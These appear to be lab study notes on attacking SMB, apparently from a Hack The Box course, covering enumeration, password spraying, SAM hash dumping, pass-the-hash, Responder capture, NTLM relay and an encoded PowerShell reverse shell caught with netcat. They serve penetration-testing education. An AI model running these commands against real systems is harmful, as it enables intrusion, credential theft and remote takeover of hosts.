Server Message Block is used for providing shared access to files and printers across nodes on a network.

- Originally ran on top of NetBIOS over TCP/IP using TCP port 139 and UDP ports 137 and 138.
- Nowadays, Windows implemented SMB over TCP/IP without the use of NetBIOS. This is ran over port 445.
- With that being said, in order for a non-windows machine to run SMB, it needs to utilize NetBIOS and have communication over port 139 vice 445.

### Enumeration

We can utilize nmap to scan the network for any open ports on the network.

```bash
realCustampin@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445Starting Nmap 7.80 ( <https://nmap.org> ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

### Misconfigurations:

- SMB can be configured to not require authentication, which is called a **null session.**
- If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, etc.
- Most tools that interact with SMB allow null session connectivity including the following:
    - smbclient
    - smbmap
    - rpcclient
    - enum4linux

### File Share:

- Using smbclient, we can display a list of server’s shares with the option -L, and using the option -N, we tell smbclient to use a null session:

```bash
realCustampin@htb[/htb]$ smbclient -N -L //10.129.14.128        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin        C$              Disk      Default share        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)SMB1 disabled no workgroup available
```

smbmap is another tool that helps us enumerate network shares and access associated permissions.

```bash
realCustampin@htb[/htb]$ smbmap -H 10.129.14.128[+] IP: 10.129.14.128:445     Name: 10.129.14.128
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        IPC$                                                    READ ONLY       IPC Service (DEVSM)        notes                                                   READ, WRITE     CheckIT
```

Using smbmap with the -r or -R (recursive) option, one can brows the directories:

```bash
realCustampin@htb[/htb]$ smbmap -H 10.129.14.128 -r notes[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\\notes\\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

- We notice from the output above that we have read and write to the share.

Knowing that information, we can now download the file using the —download argument.

```bash
realCustampin@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\\note.txt"[+] Starting download: notes\\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

```bash
realCustampin@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\\test.txt"[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

### Remote Procedure Call

- We can use the rpcclient tool with a null session to enumerate a workstation or Domain Controller.
- Below is a good cheatsheet to use for reference when working with rpcclient:

[https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)

Using the rpcclient to enumerate users:

```bash
realCustampin@htb[/htb]$ rpcclient -U'%' 10.10.110.17rpcclient$> enumdomusersuser:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

Enum4linux is another utility that supports null sessions, and it utilizes nmblookup, net, rpcclient, and smbclient to automate some common enumeration from SMB targets such as:

- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

```bash
realCustampin@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -CENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```

### Protocol Specifics Attacks:

- If we cannot establish a null session, then we will need to get a username and password credentials to interact with SMB Protocol.
- We can either use Brute Forcing or Password Spraying

**CrackMapExec**

- This is a common tool that we can use to conduct brute-forcing and password spraying attacks:

```bash
realCustampin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-authSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\Administrator:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\jrodriguez:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\admin:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\eperez:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\amone:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\fsmith:Company01! STATUS_LOGON_FAILURE
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\tcrash:Company01! STATUS_LOGON_FAILURE

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\jurena:Company01! (Pwn3d!)
```

### SMB

- When attacking SMB, the Linux and Windows attack surface are different from eachother.
    - With a Linux box, usually will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a linux environment.
    - With a Windows box, if the user has admin permissions, we can perform operations such as:
        - Remote Command Execution
        - Extract Hashes from SAM Database
        - Enumerating Logged-on Users
        - Pass-the-Hash

### Remote Code Execution:

Sysinternals are free software that come with windows that enable a admins to control and monitor computers running windows.

- One example of this is PsExec
- Other examples of this can be found on Linux:
    - [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
    - [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described [here](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access). This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
    - [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
    - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
    - [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

### Enumerating Logged-on Users:

- We can use crackmapexec to enumerate logged-on users on all machines within the same network.

```bash
realCustampin@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-usersSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\\demouser                logon_server: WIN10BOX
```

### Extracting Hashes from SAM Database:

- We can also use crackmapexec to dump the hashes from the SAM file which is a database on a windows host.

```bash
realCustampin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --samSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

### Pass-the-Hash

- If we manage to get an NTLM hash of a user, and if we can’t crack it, we can still use the hash to authenticate over SMB with PtH.

```bash
realCustampin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FESMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

### Force Authentication Attacks:

- We can abuse the SMB protocol by creating a fake SMB server to caputer users’ NetNTLM v1/v2 hashes.
- Tool that we can use is called **Responder.**

`realCustampin@htb[/htb]**$** responder -I <interface name>`

When a user or system tries to perform a Name Resolution, a series of procedures are conducted by a machine to retrieve a host’s IP address by its hostname. On windows, the procedure is as follows:

- The hostname file share's IP address is required.
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Suppose a user mistyped a shared folder's name `\\\\mysharefoder\\` instead of `\\\\mysharedfolder\\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.

Once the credentials have been sent over via in an NTLM hash, we can then crack using hashcat.

```bash
realCustampin@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txthashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: compu -> kodiak1Started: Mon Apr 11 16:49:34 2022
Stopped: Mon Apr 11 16:49:37 2022
```

After the hash was cracked, we need to set our fake smb server to OFF:

```bash
realCustampin@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='SMB = Off
```

And then, we can execute impacket-ntlmrelayx with option —no-http-server, -smb2support, and the target machine with the option -t.

```bash
realCustampin@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

- This will now dump the SAM Database and allow us to gain more NTLM hashes that we can crack.

We now can create a reverse shell from [revshells.com](http://revshells.com): `realCustampin@htb[/htb]**$** impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'`

And setting up a netcat listener on our attack host:

```bash
realCustampin@htb[/htb]$ nc -lvnp 9001listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\\Windows\\system32> whoami;hostname

nt authority\\system
WIN11BOX
```